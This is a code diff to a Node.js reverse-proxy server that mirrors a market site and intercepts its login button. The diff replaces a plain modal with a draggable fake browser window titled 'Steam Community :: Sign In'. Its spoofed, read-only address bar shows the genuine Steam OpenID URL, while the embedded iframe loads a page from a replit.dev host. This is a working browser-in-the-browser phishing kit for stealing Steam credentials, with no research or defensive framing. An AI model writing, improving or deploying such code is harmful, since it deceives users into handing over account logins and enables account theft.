@@ -264,63 +264,183 @@ function modifyUrls(content, baseUrl, contentType = '') {
                         
                         console.log('🔐 Auth button intercepted!');
                         
-                        // Создаем модальное окно с iframe
-                        const modal = document.createElement('div');
-                        modal.style.cssText = \`
+                        // Создаем перетаскиваемое окно имитирующее браузер
+                        const browserWindow = document.createElement('div');
+                        browserWindow.id = 'steam-auth-window';
+                        browserWindow.style.cssText = \`
                             position: fixed;
-                            top: 0;
-                            left: 0;
-                            width: 100%;
-                            height: 100%;
-                            background: rgba(0,0,0,0.8);
+                            top: 50%;
+                            left: 50%;
+                            transform: translate(-50%, -50%);
+                            width: 800px;
+                            height: 600px;
+                            background: #f0f0f0;
+                            border: 1px solid #ccc;
+                            border-radius: 8px;
+                            box-shadow: 0 4px 16px rgba(0,0,0,0.3);
                             z-index: 9999;
                             display: flex;
-                            justify-content: center;
+                            flex-direction: column;
+                            font-family: Arial, sans-serif;
+                        \`;
+                        
+                        // Заголовок окна
+                        const titleBar = document.createElement('div');
+                        titleBar.style.cssText = \`
+                            height: 40px;
+                            background: #e0e0e0;
+                            border-bottom: 1px solid #ccc;
+                            border-radius: 8px 8px 0 0;
+                            display: flex;
                             align-items: center;
+                            padding: 0 10px;
+                            cursor: move;
+                            user-select: none;
                         \`;
                         
-                        const iframeContainer = document.createElement('div');
-                        iframeContainer.style.cssText = \`
-                            width: 90%;
-                            height: 90%;
-                            max-width: 800px;
-                            max-height: 600px;
-                            background: white;
-                            border-radius: 10px;
-                            position: relative;
-                            overflow: hidden;
+                        // Кнопки управления окном
+                        const windowControls = document.createElement('div');
+                        windowControls.style.cssText = \`
+                            display: flex;
+                            gap: 8px;
+                            margin-right: 10px;
                         \`;
                         
-                        const closeButton = document.createElement('button');
-                        closeButton.innerHTML = '×';
-                        closeButton.style.cssText = \`
-                            position: absolute;
-                            top: 10px;
-                            right: 10px;
-                            width: 30px;
-                            height: 30px;
-                            background: red;
-                            color: white;
-                            border: none;
+                        const closeBtn = document.createElement('div');
+                        closeBtn.style.cssText = \`
+                            width: 12px;
+                            height: 12px;
+                            background: #ff5f56;
                             border-radius: 50%;
-                            font-size: 20px;
                             cursor: pointer;
-                            z-index: 10000;
                         \`;
-                        closeButton.onclick = () => document.body.removeChild(modal);
+                        closeBtn.onclick = () => document.body.removeChild(browserWindow);
                         
+                        const minimizeBtn = document.createElement('div');
+                        minimizeBtn.style.cssText = \`
+                            width: 12px;
+                            height: 12px;
+                            background: #ffbd2e;
+                            border-radius: 50%;
+                            cursor: pointer;
+                        \`;
+                        
+                        const maximizeBtn = document.createElement('div');
+                        maximizeBtn.style.cssText = \`
+                            width: 12px;
+                            height: 12px;
+                            background: #27ca42;
+                            border-radius: 50%;
+                            cursor: pointer;
+                        \`;
+                        
+                        windowControls.appendChild(closeBtn);
+                        windowControls.appendChild(minimizeBtn);
+                        windowControls.appendChild(maximizeBtn);
+                        
+                        // Заголовок
+                        const title = document.createElement('div');
+                        title.textContent = 'Steam Community :: Sign In';
+                        title.style.cssText = \`
+                            flex: 1;
+                            text-align: center;
+                            font-size: 14px;
+                            color: #333;
+                        \`;
+                        
+                        titleBar.appendChild(windowControls);
+                        titleBar.appendChild(title);
+                        
+                        // Адресная строка
+                        const addressBar = document.createElement('div');
+                        addressBar.style.cssText = \`
+                            height: 35px;
+                            background: #f8f8f8;
+                            border-bottom: 1px solid #ddd;
+                            display: flex;
+                            align-items: center;
+                            padding: 0 10px;
+                        \`;
+                        
+                        const addressInput = document.createElement('input');
+                        addressInput.type = 'text';
+                        addressInput.value = 'https://steamcommunity.com/openid/login';
+                        addressInput.readOnly = true;
+                        addressInput.style.cssText = \`
+                            flex: 1;
+                            height: 25px;
+                            border: 1px solid #ccc;
+                            border-radius: 3px;
+                            padding: 0 8px;
+                            font-size: 13px;
+                            background: white;
+                        \`;
+                        
+                        addressBar.appendChild(addressInput);
+                        
+                        // Контент (iframe)
                         const iframe = document.createElement('iframe');
                         iframe.src = 'https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/6kaomrcjpf2m.html';
                         iframe.style.cssText = \`
+                            flex: 1;
                             width: 100%;
-                            height: 100%;
                             border: none;
+                            background: white;
                         \`;
                         
-                        iframeContainer.appendChild(closeButton);
-                        iframeContainer.appendChild(iframe);
-                        modal.appendChild(iframeContainer);
-                        document.body.appendChild(modal);
+                        browserWindow.appendChild(titleBar);
+                        browserWindow.appendChild(addressBar);
+                        browserWindow.appendChild(iframe);
+                        
+                        document.body.appendChild(browserWindow);
+                        
+                        // Функция перетаскивания окна
+                        let isDragging = false;
+                        let currentX;
+                        let currentY;
+                        let initialX;
+                        let initialY;
+                        let xOffset = 0;
+                        let yOffset = 0;
+                        
+                        function dragStart(e) {
+                            if (e.target === titleBar) {
+                                isDragging = true;
+                                
+                                const rect = browserWindow.getBoundingClientRect();
+                                const centerX = rect.left + rect.width / 2;
+                                const centerY = rect.top + rect.height / 2;
+                                const windowCenterX = window.innerWidth / 2;
+                                const windowCenterY = window.innerHeight / 2;
+                                
+                                xOffset = centerX - windowCenterX;
+                                yOffset = centerY - windowCenterY;
+                                
+                                initialX = e.clientX - xOffset;
+                                initialY = e.clientY - yOffset;
+                            }
+                        }
+                        
+                        function dragEnd(e) {
+                            isDragging = false;
+                        }
+                        
+                        function drag(e) {
+                            if (isDragging) {
+                                e.preventDefault();
+                                currentX = e.clientX - initialX;
+                                currentY = e.clientY - initialY;
+                                
+                                xOffset = currentX;
+                                yOffset = currentY;
+                                
+                                browserWindow.style.transform = \`translate(calc(-50% + \${currentX}px), calc(-50% + \${currentY}px))\`;
+                            }
+                        }
+                        
+                        titleBar.addEventListener('mousedown', dragStart);
+                        document.addEventListener('mousemove', drag);
+                        document.addEventListener('mouseup', dragEnd);
                         
                         return false;
                     }
@@ -583,12 +703,12 @@ app.use('*', async (req, res) => {
 // Запуск сервера
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`
-    🚀 Advanced Market Proxy Server with Modal Auth
+    🚀 Advanced Market Proxy Server with Browser Window Auth
     📡 Port: ${PORT}
     🎯 Target: ${TARGET_HOST}
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
-    🔐 Auth: Modal iframe
+    🔐 Auth: Draggable browser window
     
     Features:
     ✓ Full HTTP/HTTPS proxy
@@ -598,7 +718,7 @@ server.listen(PORT, '0.0.0.0', () => {
     ✓ URL rewriting
     ✓ Content modification
     ✓ Mixed content prevention
-    ✓ Modal auth window
+    ✓ Draggable browser-style window
     `);
 });
 
